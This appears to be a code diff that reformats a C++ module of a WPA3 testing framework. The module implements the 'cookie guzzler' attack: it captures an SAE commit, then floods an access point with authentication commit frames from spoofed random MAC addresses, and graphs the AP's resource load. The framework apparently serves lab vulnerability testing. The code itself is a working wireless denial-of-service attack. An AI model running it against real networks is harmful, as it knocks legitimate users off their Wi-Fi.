@@ -17,107 +17,105 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::cookie_guzzler{
-    
-    RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
-        const dos_helpers::SAEPair &sae_params){
+RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
+                                  const dos_helpers::SAEPair &sae_params
+){
+    // Build the 802.11 Auth frame
+    Dot11Authentication auth;
+    auth.addr1(ap_mac);  // destination (BSSID)
+    auth.addr2(sta_mac); // spoofed source
+    auth.addr3(ap_mac);  // BSSID
+    auth.type(Dot11::MANAGEMENT);
+    auth.subtype(Dot11::AUTH);
 
-        // Build the 802.11 Auth frame
-        Dot11Authentication auth;
-        auth.addr1(ap_mac);  // destination (BSSID)
-        auth.addr2(sta_mac); // spoofed source
-        auth.addr3(ap_mac);  // BSSID
-        auth.type(Dot11::MANAGEMENT);
-        auth.subtype(Dot11::AUTH);
+    auth.auth_algorithm(3);  // algo=3  (SAE)
+    auth.auth_seq_number(1); // commit
+    auth.status_code(0);
 
-        auth.auth_algorithm(3);  // algo=3  (SAE)
-        auth.auth_seq_number(1); // commit
-        auth.status_code(0);
+    // Build SAE commit frame with proper FFC format
+    vector<uint8_t> current_payload;
 
-        // Build SAE commit frame with proper FFC format
-        vector<uint8_t> current_payload;
+    current_payload.push_back(0x13);
+    current_payload.push_back(0x00); // Group: 19 (finite field cyclic group)
 
-        current_payload.push_back(0x13);
-        current_payload.push_back(0x00);  // Group: 19 (finite field cyclic group)
-        
-        for (size_t i = 0; i < 32 && i < sae_params.scalar.size(); ++i) {
-            current_payload.push_back(sae_params.scalar[i]);
-        }
-
-        for (size_t i = 0; i < 64 && i < sae_params.element.size(); ++i) {
-            current_payload.push_back(sae_params.element[i]);
-        }
-
-        const RawPDU raw_data(current_payload);
-        auth.inner_pdu(raw_data);
-
-        RadioTap radiotap;
-        radiotap.inner_pdu(auth);
-        return radiotap;
+    for(size_t i = 0; i < 32 && i < sae_params.scalar.size(); ++i){
+        current_payload.push_back(sae_params.scalar[i]);
     }
 
-    void check_vuln(const string &iface_name,const HWAddress<6> &ap_mac, const int attack_time,
-        const dos_helpers::SAEPair &sae_params, const string &att_mac){
+    for(size_t i = 0; i < 64 && i < sae_params.element.size(); ++i){
+        current_payload.push_back(sae_params.element[i]);
+    }
 
-        PacketSender sender(iface_name);
+    const RawPDU raw_data(current_payload);
+    auth.inner_pdu(raw_data);
 
-        long long counter       = 0;
-        long long next_log      = 2000;
+    RadioTap radiotap;
+    radiotap.inner_pdu(auth);
+    return radiotap;
+}
 
-        const auto end_time = steady_clock::now() + seconds(attack_time);
-        while (steady_clock::now() < end_time) {
-            const string sta_mac = firmware::get_random_ath_masker_mac(att_mac);
-            auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);
+void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
+                const dos_helpers::SAEPair &sae_params, const string &att_mac
+){
+    PacketSender sender(iface_name);
 
-            //  burst of packet
-            constexpr size_t BURST_SIZE = 128;
-            for (size_t i = 0; i < BURST_SIZE; ++i){
-                sender.send(cg_frame);
-                this_thread::sleep_for(nanoseconds(100));
-            }
-            counter += BURST_SIZE;
+    long long counter = 0;
+    long long next_log = 2000;
 
-            if (counter >= next_log) {
-                log(LogLevel::DEBUG, "Packets sent: "+to_string(counter));
-                next_log += 20000;
-            }
+    const auto end_time = steady_clock::now() + seconds(attack_time);
+    while(steady_clock::now() < end_time){
+        const string sta_mac = firmware::get_random_ath_masker_mac(att_mac);
+        auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);
+
+        //  burst of packet
+        constexpr size_t BURST_SIZE = 128;
+        for(size_t i = 0; i < BURST_SIZE; ++i){
+            sender.send(cg_frame);
+            this_thread::sleep_for(nanoseconds(100));
         }
-        log(LogLevel::INFO, "Done. Total packets sent: "+to_string(counter));
-    }
+        counter += BURST_SIZE;
 
-    void run_attack(RunStatus &rs){
-        const ActorPtr ap = rs.get_actor("access_point");
-        //TODO this should be in setup_actor
-        const auto ssid = rs.config.at("actors").at("access_point")
-            .at("setup").at("program_config").at("ssid").get<string>();
-        const ActorPtr attacker = rs.get_actor("attacker");
-
-        const optional<dos_helpers::SAEPair> sae_params = get_commit_values(
-            rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
-        if (sae_params.has_value()) {
-            rs.start_observers();
-            log(LogLevel::INFO, "SAE Commit captured");
-            const HWAddress<6> ap_mac(ap["mac"]);
-            const auto& att_cfg = rs.config.at("attack_config");
-            const int duration = att_cfg.at("attack_time_sec").get<int>();
-            // change to monitor mode
-            attacker->set_monitor_mode();
-            attacker->up_iface();
-            check_vuln(attacker["iface"], ap_mac, duration, sae_params.value(), attacker["mac"]);
-        } else {
-            throw runtime_error("SAE Commit capture failed");
+        if(counter >= next_log){
+            log(LogLevel::DEBUG, "Packets sent: " + to_string(counter));
+            next_log += 20000;
         }
-        this_thread::sleep_for(seconds(30)); //TODO attack attack
-        ap->conn->disconnect();
     }
+    log(LogLevel::INFO, "Done. Total packets sent: " + to_string(counter));
+}
 
-    void stats_attack(const RunStatus &rs){
-        vector<unique_ptr<GraphElements>> elements;
-        //const string STA_graph_path = observer::tshark_graph(rs, "client", events);
-        //const string AP_graph_path =
-        //    observer::tshark_graph(rs, "access_point", events, observer::get_observer_folder(rs, "tcpdump"));
+void run_attack(RunStatus &rs){
+    const ActorPtr ap = rs.get_actor("access_point");
+    //TODO this should be in setup_actor
+    const auto ssid = rs.config.at("actors").at("access_point")
+                        .at("setup").at("program_config").at("ssid").get<string>();
+    const ActorPtr attacker = rs.get_actor("attacker");
 
-        const auto ap = rs.config.at("actors").at("access_point");
-        observer::resource_checker::create_graph(rs, ap["source"]);
+    const optional<dos_helpers::SAEPair> sae_params = get_commit_values(
+        rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
+    if(sae_params.has_value()){
+        rs.start_observers();
+        log(LogLevel::INFO, "SAE Commit captured");
+        const HWAddress<6> ap_mac(ap["mac"]);
+        const auto &att_cfg = rs.config.at("attack_config");
+        const int duration = att_cfg.at("attack_time_sec").get<int>();
+        // change to monitor mode
+        attacker->set_monitor_mode();
+        attacker->up_iface();
+        check_vuln(attacker["iface"], ap_mac, duration, sae_params.value(), attacker["mac"]);
+    } else{
+        throw runtime_error("SAE Commit capture failed");
     }
+    this_thread::sleep_for(seconds(30)); //TODO attack attack
+    ap->conn->disconnect();
+}
 
+void stats_attack(const RunStatus &rs){
+    vector<unique_ptr<GraphElements>> elements;
+    //const string STA_graph_path = observer::tshark_graph(rs, "client", events);
+    //const string AP_graph_path =
+    //    observer::tshark_graph(rs, "access_point", events, observer::get_observer_folder(rs, "tcpdump"));
+
+    const auto ap = rs.config.at("actors").at("access_point");
+    observer::resource_checker::create_graph(rs, ap["source"]);
+}
 }
